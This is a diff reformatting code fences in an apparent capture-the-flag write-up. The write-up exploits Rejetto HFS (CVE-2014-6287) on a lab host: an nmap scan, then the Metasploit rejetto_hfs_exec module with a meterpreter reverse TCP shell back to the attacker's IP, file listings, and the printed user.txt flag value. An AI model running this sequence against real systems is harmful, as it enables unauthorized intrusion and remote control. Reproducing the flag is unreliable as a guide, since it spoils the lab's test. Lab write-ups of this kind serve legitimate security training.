@@ -1,5 +1,6 @@
-``` text
 nmap -sV -Pn 10.49.185.165
+
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-10 10:38 EDT
 Nmap scan report for 10.49.185.165
 Host is up (0.18s latency).
@@ -24,8 +25,9 @@ Nmap done: 1 IP address (1 host up) scanned in 342.82 seconds
 
 ```
 
-``` text
 msfconsole
+
+```
 Metasploit tip: Start commands with a space to avoid saving them to history
                                                   
 
@@ -59,9 +61,9 @@ The Metasploit Framework is a Rapid7 Open Source Project
 
 ```
 
-```text
 search 2014-6287
 
+```
 Matching Modules
 ================
 
@@ -71,11 +73,17 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec                                         
+```
 
 msf > use 0
+
+```
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+```
+
 msf exploit(windows/http/rejetto_hfs_exec) > options
 
+```
 Module options (exploit/windows/http/rejetto_hfs_exec):
 
    Name       Current Setting  Required  Description
@@ -127,16 +135,29 @@ Exploit target:
 
 
 View the full module info with the info, or info -d command.
+```
 
 msf exploit(windows/http/rejetto_hfs_exec) > set rport 8080
+
+```
 rport => 8080
+```
+
 msf exploit(windows/http/rejetto_hfs_exec) > set lhost 192.168.175.163
+
+```
 lhost => 192.168.175.163
+```
 
 msf exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.49.180.14
+
+```
 rhosts => 10.49.180.14
+```
 
 msf exploit(windows/http/rejetto_hfs_exec) > run
+
+```
 [*] Started reverse TCP handler on 192.168.175.163:4444 
 [*] Using URL: http://192.168.175.163:8080/9sZr7RQr9b
 [*] Server started.
@@ -148,17 +169,24 @@ msf exploit(windows/http/rejetto_hfs_exec) > run
 [*] Server stopped.
 ```
 
-```
 meterpreter > shell
+
+```
 Process 2216 created.
 Channel 2 created.
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
+```
 
 C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Users\bill
+
+```
 cd C:\Users\bill
+```
 
 C:\Users\bill>dir
+
+```
 dir
  Volume in drive C has no label.
  Volume Serial Number is 2E4A-906A
@@ -181,11 +209,17 @@ dir
 09/27/2019  04:07 AM    <DIR>          Videos
                0 File(s)              0 bytes
               14 Dir(s)  44,214,325,248 bytes free
+```
 
 C:\Users\bill>cd Desktop   
+
+```
 cd Desktop
+```
 
 C:\Users\bill\Desktop>dir
+
+```
 dir
  Volume in drive C has no label.
  Volume Serial Number is 2E4A-906A
@@ -197,15 +231,19 @@ dir
 09/27/2019  05:42 AM                70 user.txt
                1 File(s)             70 bytes
                2 Dir(s)  44,214,321,152 bytes free
+```
 
 C:\Users\bill\Desktop>more user.txt
+
+```
 more user.txt
 b04763b6fcf51fcd7c13abc7db4fd365
 
 ```
 
-```
 C:\Users\bill\Desktop>exit
+
+```
 exit
 meterpreter > ls
 Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
